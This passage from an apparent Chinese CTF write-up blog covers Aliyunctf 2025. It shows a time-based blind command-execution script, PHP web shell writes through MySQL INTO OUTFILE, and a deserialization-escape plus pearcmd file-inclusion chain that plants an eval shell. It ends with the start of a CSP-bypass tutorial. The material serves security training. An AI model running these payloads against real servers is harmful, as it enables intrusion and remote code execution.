\u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } 爆出来：\n1 aliyunctf{076d4662-656b-4889- 长度不够，再改点：\n1 2 3 4 5 6 7 8 9 10 11 for i in range(1, 2): # 假设有 4 行 print(f\u0026#34;第{i}行\u0026#34;) for j in range(30, 60): # 假设每行最多 7 个字符 for char in charset: # 限制字符范围为字母和数字 json_data = { \u0026#34;problem_id\u0026#34;: \u0026#34;0\u0026#34;, \u0026#34;code\u0026#34;: f\u0026#39;\u0026#39;\u0026#39;import os import _posixsubprocess _posixsubprocess.fork_exec([\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, \u0026#34;if [ $(cat /flag-9* | awk NR=={i} | cut -c {j}) = \u0026#39;{char}\u0026#39; ];then sleep 2; fi\u0026#34;], [b\u0026#34;/bin/sh\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, False, None, None, None, -1, None, False) \u0026#39;\u0026#39;\u0026#39; } 然后再爆出来：\n1 ac30-77bb8c19fefa} 直接拼接到交就行了：\n1 aliyunctf{076d4662-656b-4889-ac30-77bb8c19fefa} ——————\n打卡OK 没写好的系统怎么会打卡ok呢~\n——————\n开题，跳转到了login.php，后端是php，扫目录：\n在index.php~文件中拿到了index.php文件源码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 \u0026lt;?php session_start(); if($_SESSION[\u0026#39;login\u0026#39;]!=1){ echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Please login!\\\u0026#34;);window.location.href=\\\u0026#34;./login.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; return ; } ?\u0026gt; \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; }else{ include \u0026#39;error.php\u0026#39;; } } ?\u0026gt; 还是显示必须要登录，但是在登录框有一个code，不知道是干什么的，也爆破不了。后面发现其实可以任意读取文件源码，类似xxxx.php~这样来读取文件内容，部分文件的文件泄露，下面贴一下文件内容荣，这里就只保留php代码了：\nlogin.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 \u0026lt;?php $servername = \u0026#34;localhost\u0026#34;; $username = \u0026#34;web\u0026#34;; $password = \u0026#34;web\u0026#34;; $dbname = \u0026#34;web\u0026#34;; $conn = new mysqli($servername, $username, $password, $dbname); if ($conn-\u0026gt;connect_error) { die(\u0026#34;连接失败: \u0026#34; . $conn-\u0026gt;connect_error); } session_start(); include \u0026#39;./pass.php\u0026#39;; if(isset($_POST[\u0026#39;username\u0026#39;]) and isset($_POST[\u0026#39;password\u0026#39;])){ $username=addslashes($_POST[\u0026#39;username\u0026#39;]); $password=$_POST[\u0026#39;password\u0026#39;]; $code=$_POST[\u0026#39;code\u0026#39;]; $endpass=md5($code.$password).\u0026#39;:\u0026#39;.$code; $sql = \u0026#34;select password from users where username=\u0026#39;$username\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { while($row = $result-\u0026gt;fetch_assoc()) { if($endpass==$row[\u0026#39;password\u0026#39;]){ $_SESSION[\u0026#39;login\u0026#39;] = 1; $_SESSION[\u0026#39;username\u0026#39;] = md5($username); echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;Welcome $username!\\\u0026#34;);window.location.href=\\\u0026#34;./index.php\\\u0026#34;;\u0026lt;/script\u0026gt;\u0026#34;; } } } else { echo \u0026#34;\u0026lt;script\u0026gt;alert(\\\u0026#34;错误\\\u0026#34;);\u0026lt;/script\u0026gt;\u0026#34;; die(); } $conn-\u0026gt;close(); } ?\u0026gt; pass.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class mypass { public function generateRandomString($length = 10) { $characters = \u0026#39;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#39;; $charactersLength = strlen($characters); $randomString = \u0026#39;\u0026#39;; for ($i = 0; $i \u0026lt; $length; $i++) { $randomString .= $characters[rand(0, $charactersLength - 1)]; } return $randomString; } public function checkpass($plain) { $password = $this-\u0026gt;generateRandomString(); $salt = substr(md5($password), 0, 5); $password = md5($salt . $plain) . \u0026#39;:\u0026#39; . $salt; return $password; } } cache.php文件内容：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;?php class myCache { public function writecache($name,$data) { $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $data; file_put_contents($file,$cachedata); return \u0026#39;\u0026#39;; } } class checkin{ function writec($data,$name) { $wr=new myCache(); $wr-\u0026gt;writecache($data,$name); } } ?\u0026gt; 审计代码，可以发现在index.php文件中，存在一个文件包含的操作另一个php文件的操作。\n简单说说index.php文件逻辑，序列化操作，是序列化了一个数组，案后将其存放在一个文件中（集合index.php和cache.php文件来看），可以简单写一个代码来看一下写文件的内容是什么：\n1 2 3 4 5 6 7 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;123\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#34;11112\u0026#34;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); 文件fupanc-2025-02-23.php文件内容为：\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 就是序列化数据，只是前面插入了一段php文件，估计是防止直接利用这个文件，死亡exit也绕不了，文件名不可控：\n1 $file = \u0026#39;/var/www/html/cache/\u0026#39; . $name . \u0026#39;.php\u0026#39;; 然后看其他index.php的其他代码，可以读出文件读取操作和反序列化操作，还有个字符串替换操作：\n1 2 3 4 5 6 7 $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } 这里其实就是将插入的\u0026lt;?php exit;//替换为空，然后反序列化，就是反序列化为数组，然后读取数组中的内容，再包含它。从前面的序列化的代码可以看出，这里就是包含ok.php的内容，访问没有东西，还是直接看源码，得到如下内容：\n1 2 \u0026lt;?php echo \u0026#39;ok\u0026#39;;?\u0026gt; //adminer_481.php 访问就是mysql的连接操作：\n有点类似数据库操作的内容，但是这里就没获取到源码：\n在login.php文件中可以看到数据库名以及密码等信息，直接登录看看：\n可以查看数据库文件，以及可以执行sql语句。也尝试了into outfile和日志写马，但是都没有成功。应该是没有权限。\n再看index.php代码，在isset($_POST['reason'])的代码块中，这个time似乎是可控的：\n1 2 3 4 5 6 7 8 9 10 if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } 那么是否可以打字符串逃逸呢，直接控制time的值为\u0026lt;?php exit;//的一部分，然后被替换为空，并且这里的reason变量也是可控的，这样的话就是打字符串逃逸（减少），然后包含其他文件，测试一下data函数的输出：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\u0026lt;?php exit;//\u0026#34;; echo date($a).PHP_EOL; echo date($b); //output: 111 \u0026lt;?Z08Z UTC20255228;// 不可控，打不了，date()函数会。\n还是需要打其他的方法。\n尝试一下root的一般的默认密码root，直接登进去了：\n成功执行命令：\n尝试写马：\n1 select \u0026#39;\u0026lt;?php echo 123; @eval($_POST[123]); ?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/shell.php\u0026#39; 成功执行:\n访问1.php，成功执行：\n得到flag:\n1 aliyunctf{a9d1e1d9-53d5-4d10-a96b-361d693fb502} ——————\n最后看了一下官方wp。上面的是当时打出来的非预期解法。下面来简单说说预期解是反序列化字符串逃逸打pearcmd文件包含，主要还是这里的date()函数的绕过，在前面的php测试代码中，可以看出来是有字母或其他符号，会杯输出为其他内容。但是这里可以使用反斜杠来绕过，测试代码如下：\n1 2 3 4 5 6 7 8 9 10 \u0026lt;?php $a=111; $b=\u0026#34;\\\u0026lt;\\?\\p\\h\\p\\ \\\\e\\x\\i\\\\t\\;\\/\\/\u0026#34;; echo date($a).PHP_EOL; echo date($b); /*output: 111 \u0026lt;?php exit;// */ 由于php的特性，这里的\\e和\\t是一个特殊字符，所以多拿一个\\来将前面的给转义，让其不被解析为特殊字符。\n从输出结果可以看出来成功输出想要的内容。再加上前面说的time变量是可控的，再加上reason变量可控，这里尝试如下包含pearcmd文件内容，简单来构造一下：\n正常的内容大概如下：\n1 \u0026lt;?php exit;//a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:3:\u0026#34;123\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 然后会将\u0026lt;?php exit;//替换为空，这里看一下怎么利用。基本思路就是将background里面对应的ok给删去，替换为pearcmd内容。\n看了一下，感觉这里是需要结合当时字符串增多的特性来使用的，就是反序列化时匹配到足够的字符，然后就不会再匹配后面的字符了,这里需要将\u0026quot;;s:4:\u0026quot;time\u0026quot;;s:5:\u0026quot;吞掉，然后马上将time的值给设置给指定的值，在吞掉结束后，马上匹配一个\u0026quot;+后续字符来构成一个完整的序列化字符串，然后这里的长度匹配如下：\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 18 13 需要改成长度匹配，而整数倍，这里只能修改字符串长度，所以让如下即可：\n1 2 3 4 5 6 print(len(\u0026#39;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;xxxxxxxx\u0026#39;)) a=\u0026#39;\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39; print(len(\u0026#39;\u0026lt;?php exit;//\u0026#39;)) //output: 26 13 传参就如下传即可：\n1 xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;} 看看输出：\n1 2 3 4 5 6 7 8 9 10 11 12 13 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $b=str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data); echo $b; //output: a:4:{s:4:\u0026#34;name\u0026#34;;s:6:\u0026#34;fupanc\u0026#34;;s:6:\u0026#34;reason\u0026#34;;s:26:\u0026#34;\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:66:\u0026#34;xxxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:2:\u0026#34;ok\u0026#34;;} 在反序列化尝试时运行报错，再看，发现是长度出了问题，这里的time的长度为66，但是我原先测试的时候是设置为了一个长度为5的值，所以这里需要改一下长度，减少一个x即可，最后尝试如下：\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:7:\u0026#34;pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; 输出为：\n1 pearcmd.php 成功了！，那么就可以打了，但是需要注意一下文件包含的路径，由于代码逻辑拼接了路径，所以需要进行目录穿越，最后的payload如下:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026lt;?php $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;\u0026#34;fupanc\u0026#34;,\u0026#34;reason\u0026#34;=\u0026gt;\u0026#34;\u0026lt;?php exit;//\u0026lt;?php exit;//\u0026#34;,\u0026#34;time\u0026#34;=\u0026gt;\u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39;,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $name=\u0026#34;fupanc\u0026#34;.\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;); $file = $name . \u0026#39;.php\u0026#39;; $cachedata = \u0026#34;\u0026lt;?php exit;//\u0026#34; . $arraya; file_put_contents($file,$cachedata); $data=file_get_contents($file); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); echo $checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; //output: ../../../../usr/local/lib/php/pearcmd.php 再简单进行一下预期解的做法：\n在login.php文件内容中可以看到登录以及存入数据库的逻辑，并且是直接写入web数据库的，直接连接即可，然后自己写一个就行了：\n1 2 3 4 \u0026lt;?php $code=2222; $password=\u0026#34;2222\u0026#34;; echo md5($code.$password).\u0026#39;:\u0026#39;.$code; 输出内容作为密码，然后建立数据：\n然后直接登录即可：username:fupanc password:2222 code:2222。\n这样就能够进入index.php页面进行文件包含了，为了能够控制date()函数传参，需要加一个\\，这里直接用脚本来分割：\n1 2 3 input_str = \u0026#39;xxxxxxx\u0026#34;;s:4:\u0026#34;time\u0026#34;;s:5:\u0026#34;11112\u0026#34;;s:10:\u0026#34;background\u0026#34;;s:37:\u0026#34;../../../../usr/local/lib/php/pearcmd\u0026#34;;}\u0026#39; output_str = \u0026#39;\u0026#39;.join([f\u0026#39;\\\\{c}\u0026#39; for c in input_str]) print(output_str) 得到：\n1 \\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} 从代码逻辑中可以得到传两次，一次写入文件，一次读取为文件从而包含：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php include \u0026#39;./cache.php\u0026#39;; $check=new checkin(); if(isset($_POST[\u0026#39;reason\u0026#39;])){ if(isset($_GET[\u0026#39;debug_buka\u0026#39;])) { $time=date($_GET[\u0026#39;debug_buka\u0026#39;]); }else{ $time=date(\u0026#34;Y-m-d H:i:s\u0026#34;); } $arraya=serialize(array(\u0026#34;name\u0026#34;=\u0026gt;$_SESSION[\u0026#39;username\u0026#39;],\u0026#34;reason\u0026#34;=\u0026gt;$_POST[\u0026#39;reason\u0026#39;],\u0026#34;time\u0026#34;=\u0026gt;$time,\u0026#34;background\u0026#34;=\u0026gt;\u0026#34;ok\u0026#34;)); $check-\u0026gt;writec($_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;),$arraya); } if(isset($_GET[\u0026#39;check\u0026#39;])){ $cachefile = \u0026#39;/var/www/html/cache/\u0026#39; . $_SESSION[\u0026#39;username\u0026#39;].\u0026#39;-\u0026#39;.date(\u0026#34;Y-m-d\u0026#34;). \u0026#39;.php\u0026#39;; if (is_file($cachefile)) { $data=file_get_contents($cachefile); $checkdata = unserialize(str_replace(\u0026#34;\u0026lt;?php exit;//\u0026#34;, \u0026#39;\u0026#39;, $data)); $check=\u0026#34;/var/www/html/\u0026#34;.$checkdata[\u0026#39;background\u0026#39;].\u0026#34;.php\u0026#34;; include \u0026#34;$check\u0026#34;; } } ?\u0026gt; 第一次传参如下：\n1 2 3 get传参：debug_buka=\\x\\x\\x\\x\\x\\x\\x\\\u0026#34;\\;\\s\\:\\4\\:\\\u0026#34;\\t\\i\\m\\e\\\u0026#34;\\;\\s\\:\\5\\:\\\u0026#34;\\1\\1\\1\\1\\2\\\u0026#34;\\;\\s\\:\\1\\0\\:\\\u0026#34;\\b\\a\\c\\k\\g\\r\\o\\u\\n\\d\\\u0026#34;\\;\\s\\:\\3\\7\\:\\\u0026#34;\\.\\.\\/\\.\\.\\/\\.\\.\\/\\.\\.\\/\\u\\s\\r\\/\\l\\o\\c\\a\\l\\/\\l\\i\\b\\/\\p\\h\\p\\/\\p\\e\\a\\r\\c\\m\\d\\\u0026#34;\\;\\} post传参：reason=\u0026lt;?php exit;//\u0026lt;?php exit;// 有符号，注意url编码，如下:\n第二次传参：\n1 get传参：?+config-create+/\u0026amp;check=1\u0026amp;/\u0026lt;?=@eval($_POST[\u0026#39;cmd\u0026#39;]);?\u0026gt;+/var/www/html/1234.php 如下：\n这里简单注意一下格式吧，这个config-create不是有两种格式吗，另外一种格式只有官方wp那样可以写进去。\n最后进行命令执行即可：\n同样拿到flag。\n后面的两道java题打的时候没打出来，就后面学了再来复现吧。\nJtools Java Tools\n————————————\nEspresso Coffee Buy me a cup of Espresso Coffee plz! Here are some JDK download links you may need\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-linux-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-amd64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-macos-aarch64.tar.gz\nhttps://gds.oracle.com/download/espresso/archive/espresso-java21-24.1.1-windows-amd64.zip\nhint：\nFocus on the fields of org.graalvm.continuations.ContinuationImpl.FrameRecord\nAbuse org.graalvm.continuations.ContinuationImpl#stackFrameHead =\u0026gt; Hijack the Control Flow =\u0026gt; \u0026ldquo;ROP\u0026rdquo;\nCommand Exec Gadget\nsun.print.UnixPrintJob\n————————\n官方wp：\nhttps://xz.aliyun.com/news/17029?time__1311=eqUxn7DQoYqGT4mqGXnjAD97YGOzO1tH4D\u0026u_atoken=fcc01ab1aceadb0f15326e34dbaa7b49\u0026u_asig=1a0c399b17406473291628172e011d\n","date":"2025-02-26T21:17:10+08:00","permalink":"https://fupanc-w1n.github.io/p/aliyunctf2025wp/","title":"Aliyunctf2025[WP]"},{"content":"CSP绕过 前面了解了一下HttpOnly，后面就没怎么再学习XSS的东西了，这里又遇到了这个，再来学习一下。\nCSP简介 内容安全策略（Content Security Policy）是一种用于缓解大部分类型的内容注入攻击的web应用技术，比如xss、数据注入等可实现数据窃取、网站破坏行为的安全问题。该策略可以通过设定规则，来限制浏览器只能加载和指定特定来源的资源，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行，可以有效减少XSS等攻击的风险。但是同样存在绕过手段。\nCSP可以分为如下两种：\nContent-Security-Policy： 通过响应头来设置，浏览器接收到这个头后，会立即执行策略。\nContent-Security-Policy-Report-Only： 同样的通过响应头来设置，这个表示不执行限制选项，只记录未违反限制的行为，并且必须与report-uri选项配合使用。简单来说，就是可以通过这个HTTP头部来设置规则，同时必须要设置报告的uri，当前端页面的加载违反规则，浏览器只会以JSON格式向URI发送报告，而不会限制。具体可以参考 《Content-Security-Policy-Report-Only》\nCSP策略的使用 简单说了一下CSP的分类，那么如何使用呢？可以通过如下两个方式：\nHTTP响应头，Content-Security-Policy响应头，也就是前面说的那个。\n直接通过网页前端的 \u0026lt;mata\u0026gt; 标签\n——————\n（1）常用的策略指令：\nscript-src：定义了页面中Javascript的有效来源 style-src：定义了页面中CSS样式的有效来源 img-src：定义了页面中图片和图标的有效来源 font-src：定义了字体加载的有效来源 connect-src：定义了请求，如XMLHttpRequest（AJAX请求）、WebSocket和EventSource的连接来源。 child-src：定义了web workers以及嵌套的浏览上下文（如\u0026lt;frame\u0026gt;和\u0026lt;iframe\u0026gt;）的源。 object-src：限制可以加载哪些插件（例如Flash、XSS等） default-src：定义那些没有被更精确指令指定的安全策略，也就是上面说的那些等，但是也有的指令不会被指定，比如base-uri，这个在后面的CSP绕过会说。 （2）内容源的几点说明：\n其实就是取值，既然有有了指令，那么肯定要有指令内容，这里简单说几个：\n1 2 3 4 5 6 7 8 9 * : 星号表示允许任何URL资源，没有限制 \u0026#39;none\u0026#39;：表示不匹配任何资源 \u0026#39;self\u0026#39; 同源策略,即允许同域名同端口下,同协议下的请求 \u0026#39;unsafe-inline\u0026#39; 允许使用内联资源，也就是允许\u0026lt;script\u0026gt;等标签和事件监听函数的执行，一般不会使用 \u0026#39;unsafe-eval\u0026#39; 允许不安全的动态代码执行,如js中的eval() Function()等函数 https: 只允许通过https协议加载资源 nonce: 每次HTTP回应给出一个授权token,页面内嵌脚本必须有这个token,才会执行,设置值为：\u0026#39;nonce-12345678\u0026#39; 如下： \u0026lt;script nonce=\u0026#34;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=\u0026#34;\u0026gt;alert(123)\u0026lt;/script\u0026gt; 等，注意如上的单引号是必须的。其他的指令及内容参考：《CSP》\n最后简单看看如何设置，对于响应头，如下即可：\n1 header(\u0026#34;Content-Security-Policy: script-src \u0026#39;self\u0026#39;\u0026#34;); 对于前端的\u0026lt;meta\u0026gt;标签，直接在前端写就行了，一般是在 HTML 文档的 \u0026lt;head\u0026gt; 部分使用 \u0026lt;meta\u0026gt; 标签来定义（并且如果定义在\u0026lt;body\u0026gt;标签则会被浏览器忽略导致无法实施CSP），比如：\n1 \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;default-src \u0026#39;self\u0026#39; http://www.dlrb.com \u0026#39;unsafe-inline\u0026#39;\u0026#34; \u0026gt; 需要注意的是：\n在 HTTP 响应头中的 CSP 策略会对整个页面生效，包括内联脚本、内联样式以及外部资源的加载。\n\u0026lt;meta\u0026gt;标签设置的 CSP 策略仅对其之后的资源生效，而在 \u0026lt;meta\u0026gt; 标签之前存在内联脚本或样式，这些内联内容不会受到 CSP 策略的限制。因此应确保将其放置在 \u0026lt;head\u0026gt; 部分的最前面，以覆盖所有内联脚本和样式。\n简单本地测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 1：此时 CSP 尚未生效 console.log(\u0026#34;内联脚本 1 执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 2：CSP 已生效，执行会被阻止 console.log(\u0026#34;内联脚本 2 不会执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;!--\u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; content=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;--\u0026gt; \u0026lt;script\u0026gt; // 内联脚本 3：CSP 已生效，执行会被阻止 console.log(\u0026#34;内联脚本 3 不会执行\u0026#34;); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 可以改改看看前面的说明，完全正确。\nCSP绕过 如下是一个简单的留言框+CSP的前端页面，以这个代码来简单谈谈CSP绕过：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Security-Policy\u0026#34; 